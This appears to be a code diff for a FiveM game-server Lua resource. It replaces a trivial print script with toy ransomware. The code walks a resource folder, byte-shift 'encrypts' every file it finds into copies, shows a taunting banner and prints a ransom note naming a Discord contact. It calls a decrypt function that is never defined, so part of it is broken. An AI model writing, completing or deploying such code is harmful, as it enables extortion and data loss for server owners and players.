@@ -1,2 +1,129 @@
-print("gay")
-print("GAY")
+
+function find_file(dir, file_name)
+    local t = {}
+    for file in io.popen('dir /B /S "' .. dir .. '"'):lines() do
+        local path = file
+        t[file] = file
+    end
+    return t
+end
+
+function encrypt_file(file_path, key)
+    -- Read the file contents into a string
+    print("encrypt", file_path,key)
+    local file = io.open(file_path, "rb")
+    local file_contents = file:read("*all")
+    file:close()
+  
+    -- Encrypt the file contents using the Caesar Cipher
+    local encrypted_file_contents = ""
+    for i = 1, #file_contents do
+      local char = file_contents:sub(i, i)
+      local char_code = string.byte(char)
+      local encrypted_char_code = (char_code + key) % 256
+      local encrypted_char = string.char(encrypted_char_code)
+      encrypted_file_contents = encrypted_file_contents .. encrypted_char
+    end
+  
+    -- Write the encrypted file contents to a new file
+    local encrypted_file = io.open(file_path .. "-encrypted.lua", "wb")
+    encrypted_file:write(encrypted_file_contents)
+    encrypted_file:close()
+end
+
+function middle_to_left(string, delay, width)
+    local padding = math.floor((width - #string) / 2)
+    local padding_string = string.rep(" ", padding)
+    for i=0,25 do 
+        print("\n")
+    end
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+    print("\r" .. padding_string .. string)
+
+    io.flush() -- flush the output buffer
+    for i = 1, padding + #string do
+        for i=0,25 do 
+            print("\n")
+        end
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+        print("\r" .. string.sub(padding_string, i, padding + #string) .. string)
+
+        io.flush() -- flush the output buffer
+        Citizen.Wait(delay) -- delay for specified number of seconds
+    end
+    print() -- add a newline after the animation is complete
+    return true
+end
+
+  
+Citizen.CreateThread(function()
+    local path = "D:/yespixel/resources/testallah"
+    local f = find_file(path, "ss")
+    local key = 92221684282877
+
+    for k,v in pairs(f) do 
+        encrypt_file(v,key)
+    end
+
+    Citizen.Wait(500)
+
+    local f = find_file(path, "ss")
+    for k,v in pairs(f) do 
+        decrypt_file(v, key)
+    end
+
+
+    Citizen.Wait(500)
+
+
+    
+    local s = middle_to_left("RoninWashere - You FUCKED Up!", 50, 100)
+
+    if s then 
+        print("Hello!")
+        print()
+        Citizen.Wait(2500)
+        print("First Of All I Am Sorry Your All Files Are")
+        print()
+        Citizen.Wait(2500)
+        print("ENCRYPTED!!!")
+        print()
+        Citizen.Wait(2500)
+        print("If You Want Your Files Back Contact yallamcflalla#6597")
+        print()
+        Citizen.Wait(2500)
+        print("muck <3 -ronin")
+    end
+
+end)
